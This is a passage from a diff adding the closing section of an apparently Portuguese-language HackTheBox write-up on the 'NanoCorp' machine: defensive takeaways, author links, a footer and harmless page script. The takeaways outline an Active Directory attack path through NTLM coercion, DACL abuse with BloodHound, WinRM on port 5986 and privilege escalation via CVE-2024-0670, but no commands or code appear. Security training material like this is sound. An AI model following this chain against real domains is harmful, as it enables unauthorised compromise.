+          sem interação do usuário. Patching e bloqueio de autenticação NTLM outbound são as
+          mitigações principais.
+        </span>
+      </div>
+      <div class="takeaway">
+        <span class="takeaway-icon">▸</span>
+        <span>
+          <strong>DACL misconfigurations</strong> são invisíveis para a maioria dos defensores,
+          mas trivialmente exploráveis com BloodHound. Permissões como <code>AddSelf</code> e
+          <code>ForceChangePassword</code> devem ser auditadas regularmente em ambientes AD.
+        </span>
+      </div>
+      <div class="takeaway">
+        <span class="takeaway-icon">▸</span>
+        <span>
+          <strong>WinRM sobre HTTPS na porta 5986</strong> quebra o tooling padrão
+          (<code>evil-winrm</code> assume 5985/HTTP). Sempre verificar serviços SSL
+          durante a enumeração — o certificado revela o hostname real do DC.
+        </span>
+      </div>
+      <div class="takeaway">
+        <span class="takeaway-icon">▸</span>
+        <span>
+          <strong>CVE-2024-0670</strong> demonstra o perigo de agentes de monitoramento
+          rodando como SYSTEM. Race conditions em caminhos de repair de MSI são um vetor
+          de LPE clássico e frequentemente ignorado em hardening.
+        </span>
+      </div>
+      <div class="takeaway">
+        <span class="takeaway-icon">▸</span>
+        <span>
+          NanoCorp ilustra como uma cadeia de misconfigs individualmente "baixo risco"
+          pode levar a comprometimento total do domínio — espelhando caminhos de ataque
+          de APTs reais documentados no MITRE ATT&CK.
+        </span>
+      </div>
+    </div>
+
+    <!-- AUTH -->
+    <div class="writeup-auth">
+      <div class="auth-id">
+        <strong>@Rel3ase</strong> — Offensive Security Researcher
+      </div>
+      <div class="auth-links">
+        <a href="https://github.com/releaseown" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://www.linkedin.com/in/rianjunior/" target="_blank" rel="noopener">LinkedIn</a>
+        <a href="https://x.com/S1lentNightSf" target="_blank" rel="noopener">X</a>
+        <a href="https://app.hackthebox.com/users/2282037" target="_blank" rel="noopener">HTB</a>
+      </div>
+    </div>
+
+  </div><!-- /writeup-body -->
+
+  <!-- ── FOOTER ── -->
+  <footer>
+    <p class="footer-text">
+      &copy; <span id="yr"></span> <span>REL3ASE</span> — All Rights Reserved.
+      &nbsp;|&nbsp; writeups/nanocorp.html
+    </p>
+  </footer>
+
+  <script>
+    document.getElementById('yr').textContent = new Date().getFullYear();
+
+    /* ── Copy button ── */
+    function copyCode(btn) {
+      const pre = btn.closest('.code-block').querySelector('pre');
+      const text = pre.innerText || pre.textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'copied!';
+        setTimeout(() => btn.textContent = 'copy', 1800);
+      });
+    }
+
+    /* ── Scroll reveal ── */
+    const obs = new IntersectionObserver(entries => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          e.target.style.opacity = '1';
+          e.target.style.transform = 'translateY(0)';
+          obs.unobserve(e.target);
+        }
+      });
+    }, { threshold: .08 });
+
+    document.querySelectorAll('.ws, .code-block, .callout, .creds-box, .flag-box, .takeaway').forEach(el => {
+      el.style.opacity = '0';
+      el.style.transform = 'translateY(20px)';
+      el.style.transition = 'opacity .5s ease, transform .5s ease';
+      obs.observe(el);
+    });
+  </script>
+</body>
+</html>
